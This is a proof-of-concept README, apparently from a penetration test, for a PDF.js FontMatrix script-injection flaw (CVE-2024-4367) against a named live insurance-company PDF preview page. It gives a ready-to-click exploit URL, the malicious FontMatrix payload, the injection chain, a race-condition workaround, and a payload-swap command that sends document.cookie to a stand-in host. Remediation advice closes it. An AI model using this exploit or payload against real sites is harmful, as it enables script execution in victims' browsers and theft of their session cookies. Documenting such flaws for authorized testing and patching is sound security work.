# CVE-2024-4367 PDF.js FontMatrix PoC

Authorized penetration test artifact — 友邦保险（AIA）PDF 预览页 XSS 验证。

## 目标

`https://rttstreport-static.aia.com.cn/ohp2/OH/pdf/index.html`

- **组件**：PDF.js **2.0.943**（build dc98bf76，2018-04）
- **修复线**：4.2.67（v3 分支 3.11.174）
- **影响**：字体字典 `/FontMatrix` 数组元素未经 `isNumberArray` 类型校验，流入 `new Function` 拼接，导致域内任意 JavaScript 执行
- **等级**：high

## 一键验证

```
https://rttstreport-static.aia.com.cn/ohp2/OH/pdf/index.html?url=https%3A%2F%2Fraw.githubusercontent.com%2Fweae26%2Faia-pdfjs-poc%2Fmain%2Fpoc.pdf
```

预期：约 5~11 秒后弹出 `alert` 显示 `rttstreport-static.aia.com.cn`。

## 注入链

```
① worker@405852   fontMatrix = getArray("FontMatrix")          ← 无类型校验（根因）
② worker@637516   compileGlyph: args = fontMatrix.slice()
③ worker@379738   handleText: Pattern 分支 → getPathJs
④ worker@637419   getPathJs → compileGlyph
⑤ pdf.min.js@162544  args.join(",") → new Function("c","size",code)   ← sink
⑥ pdf.min.js@160900  isEvalSupported() = true                          ← 开关
```

## 恶意 PDF 核心片段

```
/FontMatrix [0.1 0 0 0.1 0 (1\);
window.__pdfjs_pwn=1;alert(document.domain)
//)]
```

## 触发条件（三选一）

1. **Pattern 填充色**：`/Pattern cs` + `/P1 scn`（本 PoC 用这个）
2. `textRenderingMode & ADD_TO_PATH`
3. `disableFontFace` 开启

字体必须被**真实渲染**（内容流有 `Tj` 引用该字体的文本）。

## 竞态说明（重要）

单次渲染会因时序竞态静默失败：主线程 `paintChar` 可能在 worker 的 FontPath commonobj 到达前完成绘制，`getPathGenerator` 走 catch 返回空函数。

**本 PoC 用 24 次重复文本渲染规避**——后续 paint 必然命中已就绪的 path。

## 文件

| 文件 | 说明 |
|---|---|
| `poc.pdf` | 恶意 PDF（2174 字节） |
| `gen_pdf3.py` | 生成脚本（可改 payload） |

## 换 payload

```bash
python gen_pdf3.py out.pdf "window.__pdfjs_pwn=1;fetch('https://oast.example/?c='+document.cookie)"
```

## 对照实验

| 投递内容 | canvas | `__pdfjs_pwn` | alert |
|---|---|---|---|
| 恶意 PDF | 1 | **1** | **弹出** |
| 无害 PDF（同通道） | 1 | undefined | 无 |
| FontMatrix 换 `0//BENIGN_CONTROL` | 1 | undefined | 无 |
| 不带 url 参数 | 0 | undefined | 无 |

## 修复建议

1. **升级 PDF.js >= 4.2.67**
2. `getDocument({ isEvalSupported: false })`
3. CSP `script-src` 禁 `unsafe-eval`
4. 恢复 url 白名单（精确 hostname 比对）
5. 预览页 sandbox iframe 隔离

## 授权声明

本 PoC 仅用于友邦保险（AIA）主体名下已获正式书面授权的渗透测试。未经授权使用于其他目标属违法行为。
